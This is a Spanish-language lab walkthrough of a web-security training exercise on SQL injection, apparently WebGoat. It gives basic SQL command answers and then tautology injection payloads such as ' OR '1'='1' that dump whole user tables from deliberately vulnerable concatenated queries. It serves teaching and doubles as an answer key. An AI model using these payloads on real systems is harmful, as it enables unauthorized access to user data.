# (A3) Injection

## Lesson 2

### Desarrollo

Debemos acceder al departamento del empleado "Bob Franco" mediante una consulta SQL.

Para poder realizar la consulta usaremos el comando `SELECT`:

```sql
SELECT columna FROM tabla WHERE condiciones

-- Ejemplo
SELECT * FROM employees WHERE userid='96134'
SELECT first_name FROM employees WHERE userid='96134'
SELECT department FROM employees WHERE first_name='Bob' AND last_name='Franco'
```

### Solución:

Para completar el ejercicio debemos ingresar el siguiente comando SQL:

```sql
SELECT department FROM employees WHERE userid='96134'
```

## Lesson 3

### Desarrollo

Debemos modificar el departamento del empleado "Bob Franco" mediante una consulta SQL a "Sales".

Para poder realizar la consulta usaremos el comando `UPDATE`:

```sql
UPDATE tabla SET columna='valor' WHERE condiciones

-- Ejemplo
UPDATE employees SET first_name = 'Mario' WHERE userid='96134'
```

### Solución:

Para completar el ejercicio debemos ingresar el siguiente comando SQL:

```sql
UPDATE employees SET department='Sales' WHERE userid=96134
```

## Lesson 4

Debemos añadir una columna "phone(varchar(20))" a la tabla "employees".

Para poder realizar la consulta usaremos el comando `ALTER TABLE`:

```sql
ALTER TABLE tabla ADD columna tipo

-- Ejemplo
ALTER TABLE employees ADD hobby varchar(20)
```

### Solución:

Para completar el ejercicio debemos ingresar el siguiente comando SQL:

```sql
ALTER TABLE employees ADD phone varchar(20)
```

## Lesson 5

### Desarrollo

Debemos dar permisos al usuario "unauthorized_user" en la tabla "grant_rigths".

Para poder realizar la consulta usaremos el comando `GRANT`:

```sql
GRANT privilegio ON obj TO usuario
```

Donde:

- `privilegio`: Es el permiso que se desea otorgar. Puede ser `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `ALL`.
- `obj`: Es el objeto al que se le otorga el permiso. Puede ser una tabla, vista, procedimiento almacenado, etc.
- `usuario`: Es el usuario al que se le otorga el permiso.

### Solución:

Para completar el ejercicio debemos ingresar el siguiente comando SQL:

```sql
GRANT SELECT ON grant_rigths TO unauthorized_user
```

## Lesson 9

### Desarrollo

Debemos acceder a la información de la tabla de usuarios seleccionando las opciones correctas para completar la consulta SQL inyectada.

La sentencia SQL original es la siguiente:

```sql
"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";
```

### Solución

Para completar el ejercicio debemos seleccionar las siguientes opciones:

- `Smith'`
- `OR`
- `1=1`

De esta forma, la consulta SQL inyectada sería:

```sql
SELECT * FROM user_data WHERE last_name='Smith' OR 1=1
```

## Lesson 10

### Desarrollo

Debemos acceder a la información de la tabla de usuarios.

Tenemos disponibles dos inputs de texto, uno para `Login_Count` y otro para `User_Id`.

### Solución

Para completar el ejercicio debemos ingresar `1` o cualquier otro valor en el campo `Login_Count` y `1 OR '1'='1'` en el campo `User_Id`.

De esta forma, la consulta SQL inyectada sería:

```sql
SELECT * FROM user_data WHERE Login_Count=1 OR '1'='1'
```

## Lesson 11

### Desarrollo

Debemos obtener la lista de usuarios completa inyectando una sentencia SQL.

Disponemos de dos inputs de texto, uno para `last_name` y otro para `auth_tan`.

Nuestra sentencia SQL es la siguiente:

```sql
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";
```

### Solución

Si queremos obtener la lista completa de usurios debemos ingresar `Smith` en el campo `last_name` y `3SL99A' or '1'='1` para ejecutar la inyección SQL.

De esta forma, la consulta SQL inyectada sería:

```sql
SELECT * FROM employees WHERE last_name='Smith' AND auth_tan='3SL99A' or '1'='1'
```
